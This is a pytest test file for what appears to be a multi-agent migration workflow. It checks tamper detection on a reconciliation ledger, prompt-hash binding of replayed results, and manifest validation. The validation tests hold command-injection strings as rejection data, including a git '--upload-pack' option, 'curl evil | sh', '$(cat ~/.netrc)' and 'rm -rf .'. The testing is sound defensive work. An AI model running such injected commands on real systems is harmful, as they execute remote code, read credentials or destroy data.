    assert re.search(r"validate_manifest\(MANIFEST\)\nBASE_SHA = launch_base\(\)\nDOCTOR = ", src)
    assert 'BASE_SHA_PATH = MANIFEST_PATH.with_suffix(".base_sha")' in src and '"base_sha": BASE_SHA' in src


def test_verifier_changed_paths_is_the_verifier_branch_minus_the_gated_pr_trees_it_merged(tmp_path):
    calls = []
    # the verifier's tree per unit dir: u rewritten (differs from the gated head 1*40 and from the launch
    # base b*40), v byte-identical to its gated head, w untouched (differs from the gated head it did not
    # merge, auto_merge off, but equals the base)
    trees = {("1" * 40, ".migration/recon/u/"): ".migration/recon/u/result.json\n",
             ("b" * 40, ".migration/recon/u/"): ".migration/recon/u/result.json\n.migration/recon/u/rows.csv\n",
             ("2" * 40, ".migration/recon/v/"): "", ("b" * 40, ".migration/recon/v/"): ".migration/recon/v/result.json\n",
             ("3" * 40, ".migration/recon/w/"): ".migration/recon/w/result.json\n", ("b" * 40, ".migration/recon/w/"): ""}

    def fake_run(cmd, **kw):
        calls.append(cmd)
        if cmd[3] == "fetch":
            return subprocess.CompletedProcess(cmd, 0)
        if cmd[3] == "rev-parse":
            return subprocess.CompletedProcess(cmd, 0, stdout=("t" * 40 if "origin/main^{commit}" in cmd else "v" * 40) + "\n")
        if cmd[3] == "merge-base":
            return subprocess.CompletedProcess(cmd, 1)
        if "--" in cmd:
            return subprocess.CompletedProcess(cmd, 0, stdout=trees[cmd[6], cmd[9]])
        return subprocess.CompletedProcess(cmd, 0, stdout=(
            ".migration/recon/wave-2/report.md\nsrc/loans.sql\n.migration/recon/u/result.json\n"
            ".migration/recon/u/rows.csv\n.migration/recon/v/result.json\n.migration/03_recon_tolerances.json\n"))

    ns = _launch_ns(tmp_path, fake_run)
    passed = [{"batch": "b1", "units": ["u"], "pr_head": "1" * 40}, {"batch": "b2", "units": ["v"], "pr_head": "2" * 40},
              {"batch": "b3", "units": ["w"], "pr_head": "3" * 40}]
    # merged evidence byte-identical to the gated PR head drops out, so does evidence the verifier never
    # touched (its tree equals the launch base: with auto_merge off it merges nothing); a rewritten
    # result.json, the verifier's own report and anything else that reached the branch stay
    assert ns["verifier_changed_paths"](2, passed) == [
        ".migration/03_recon_tolerances.json", ".migration/recon/u/result.json", ".migration/recon/wave-2/report.md",
        "src/loans.sql"]
    assert calls[0][3:] == ["fetch", "-q", "origin", "recon/wave-2"]
    assert calls[5][3:] == ["diff", "--name-only", "--no-renames", "t" * 40 + "..." + "v" * 40]
    assert calls[6][3:] == ["diff", "--name-only", "--no-renames", "1" * 40, "v" * 40, "--", ".migration/recon/u/"]
    assert calls[7][3:] == ["diff", "--name-only", "--no-renames", "b" * 40, "v" * 40, "--", ".migration/recon/u/"]
    assert calls[8][3:] == ["diff", "--name-only", "--no-renames", "2" * 40, "v" * 40, "--", ".migration/recon/v/"]
    assert calls[10][3:] == ["diff", "--name-only", "--no-renames", "3" * 40, "v" * 40, "--", ".migration/recon/w/"]
    assert calls[11][3:] == ["diff", "--name-only", "--no-renames", "b" * 40, "v" * 40, "--", ".migration/recon/w/"]
    # a passed batch whose gated head is unknown, or a diff git cannot answer: unverifiable, no PASS stands
    assert ns["verifier_changed_paths"](2, [{"batch": "b1", "units": ["u"]}]) is None

    def failing(cmd, **kw):
        raise subprocess.CalledProcessError(128, cmd)

    assert _launch_ns(tmp_path, failing)["verifier_changed_paths"](2, passed) is None


def test_git_observed_ledger_changes_beat_a_clean_self_report():
    ns = _batch_runtime()
    seen = []
    ns["pr_changed_paths"] = lambda pr_url: seen.append(pr_url) or ("c" * 40, ["src/loans.sql", ".migration/03_recon_tolerances.json"])
    out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
    assert out["status"] == "FAIL" and out["failure_class"] == "ledger_tampered"
    assert ".migration/03_recon_tolerances.json" in out["one_line_summary"]
    assert seen == ["https://example/pr/1"]  # the PR, not the branch the child names
    assert out["pr_head"] == "c" * 40  # the gated head, for the verifier's tree to be held to
    ns["pr_changed_paths"] = lambda pr_url: ("c" * 40, ["src/loans.sql"])
    out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
    assert out["status"] == "PASS" and out["pr_head"] == "c" * 40
    ns["pr_changed_paths"] = lambda pr_url: None
    out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
    assert out["status"] == "FAIL" and out["failure_class"] == "ledger_tampered" and "git" in out["one_line_summary"]


def test_a_replayed_pass_keeps_the_gate_it_passed_in_the_run_being_resumed():
    """On a resume the finished child replays, but its PR has been merged by that run's verifier (or
    forked after other accepted units were), so re-diffing it now would attribute their evidence to it.
    The recorded record is the workflow's own ledger: its gated head stands, git is not asked again,
    but only for the same result: the runtime replays a finished agent for an unchanged prompt only, so
    the record must carry the hash of the prompt it answered and name the same PR. A record from before
    the brief changed, or naming another PR, describes a different child and its PR is gated afresh."""
    ns = _batch_runtime()
    ns["pr_changed_paths"] = lambda pr_url: pytest.fail("a replayed PASS must not be re-gated")
    sha = ns["prompt_sha"](ns["child_prompt"](dict(BATCH)))
    assert re.fullmatch(r"[0-9a-f]{16,}", sha) and sha != ns["prompt_sha"](ns["child_prompt"]({**BATCH, "brief": "b2"}))
    same = {"id": "b", "status": "PASS", "pr_head": "c" * 40, "pr_url": "https://example/pr/1", "prompt_sha": sha}
    ns["REPLAYED"] = {"b": same}
    out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
    assert out["status"] == "PASS" and out["pr_head"] == "c" * 40
    assert out["prompt_sha"] == sha  # every result records the prompt it answered, for the next resume
    # a changed brief, another PR, a record without the binding, a replayed FAIL, or a PASS recorded
    # before any head was gated, is gated like a new result
    for record in ({**same, "prompt_sha": ns["prompt_sha"]("other brief")}, {**same, "pr_url": "https://example/pr/2"},
                   {k: v for k, v in same.items() if k != "prompt_sha"}, {k: v for k, v in same.items() if k != "pr_url"},
                   {**same, "status": "FAIL"}, {k: v for k, v in same.items() if k != "pr_head"}, "PASS"):
        ns["REPLAYED"] = {"b": record}
        ns["pr_changed_paths"] = lambda pr_url: ("d" * 40, [".migration/03_recon_tolerances.json"])
        out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
        assert out["status"] == "FAIL" and out["failure_class"] == "ledger_tampered" and out["pr_head"] == "d" * 40
    src = WORKFLOW.read_text()
    assert re.search(r'REPLAYED = \{\n    b\["id"\]: b for b in', src)


@pytest.mark.parametrize("value", ["--upload-pack=touch /tmp/x", "-q", "main..x", "a b", "", 3, "^main", "m:n"])
def test_validate_manifest_rejects_base_branch_and_wave_values_git_could_misread(value):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="base_branch"):
        validate_manifest(_manifest(base_branch=value))
    validate_manifest(_manifest(base_branch="release/2026.09"))
    with pytest.raises(SystemExit, match="wave"):
        validate_manifest(_manifest(wave="2 --exec"))


def test_validate_manifest_rejects_a_unit_owned_by_two_batches():
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="unit.*orders_load.*b1.*b2"):
        validate_manifest(_manifest(batches=[{"id": "b1", "units": ["orders_load"], "write_targets": ["t1"], "brief": "x"},
                                             {"id": "b2", "units": ["orders_load", "v"], "write_targets": ["t2"], "brief": "y"}]))


@pytest.mark.parametrize("unit", ["../03_recon_tolerances.json", "u/..", "a/b", "wave-1", "", ".", "..", ".hidden", 3])
def test_validate_manifest_rejects_unit_ids_that_are_not_a_plain_recon_dir_name(unit):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="unit id"):
        validate_manifest(_manifest(batches=[{"id": "b", "units": [unit], "write_targets": ["t"], "brief": "x"}]))
    validate_manifest(_manifest(batches=[{"id": "b", "units": ["orders_load", "u.v-2"], "write_targets": ["t"], "brief": "x"}]))


@pytest.mark.parametrize("source", ["LEGACY_ODBC", {"family": "sqlserver"}, {"secret": "X"}, {"family": "", "secret": "X"},
                                    {"family": "sqlserver", "secret": "X", "params": ["a=b"]},
                                    # these are pasted into the children's doctor command line
                                    {"family": "sqlserver; curl evil | sh", "secret": "X"},
                                    {"family": "sqlserver", "secret": "$(cat ~/.netrc)"},
                                    {"family": "sqlserver", "secret": "X", "params": {"db": "loans && rm -rf ."}},
                                    {"family": "sqlserver", "secret": "X", "params": {"db=x --unit": "y"}},
                                    {"family": "sqlserver", "secret": "X", "params": {"db": "--role orchestrator"}},
                                    {"family": "sqlserver", "secret": "X", "params": {"as_of": "2026-09-08 18:43:52 x"}},
                                    {"family": "sqlserver", "secret": "X", "params": {"as_of": "2026-09-08  18:43"}},
                                    {"family": "sqlserver", "secret": "X", "params": {"db": "a'b"}},
                                    {"family": "sqlserver", "secret": "X", "params": {"db": 7}}])
def test_validate_manifest_checks_the_source_block(source):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="source"):
        validate_manifest(_manifest(source=source))
    validate_manifest(_manifest(source={"family": "postgres", "secret": "LAKEBASE_SRC", "params": {"db": "loan_servicing"}}))


def test_param_values_follow_the_recon_contract_so_a_timestamp_is_accepted():
    """A mapping's ${as_of} is typically 'YYYY-MM-DD hh:mm:ss'; the recon CLI accepts exactly that
    (PARAM_RE), so the workflow must not reject it, and must quote it so the child's shell passes one value."""
    sys.path.insert(0, str(WORKFLOW.parents[1] / "data-reconciliation" / "harness"))
    from recon.cli import PARAM_RE
    ns = _functions()
    assert ns["PARAM_VALUE"].pattern == PARAM_RE.pattern.removeprefix("^").removesuffix("$")
    source = {"family": "sqlserver", "secret": "X", "params": {"as_of": "2026-09-08 18:43:52", "db": "loans"}}
    ns["validate_manifest"](_manifest(source=source))
    text = _prompt_ns(_manifest(source=source))["child_prompt"](_manifest()["batches"][0])
    flags = text[text.index("--source-family"):].split(" (the source")[0]
    assert shlex.split(flags) == ["--source-family", "sqlserver", "--source-secret", "X",
                                  "--param", "as_of=2026-09-08 18:43:52", "--param", "db=loans"]


def test_child_prompt_passes_the_source_family_and_secret_to_the_doctor():
    ns = _prompt_ns(_manifest(source={"family": "postgres", "secret": "LAKEBASE_SRC", "params": {"db": "x"}}))
    text = ns["child_prompt"](ns["MANIFEST"]["batches"][0])
    assert "--source-family postgres --source-secret LAKEBASE_SRC --param db=x" in text
    assert "--source-family" not in _prompt_ns(_manifest())["child_prompt"](_manifest()["batches"][0])
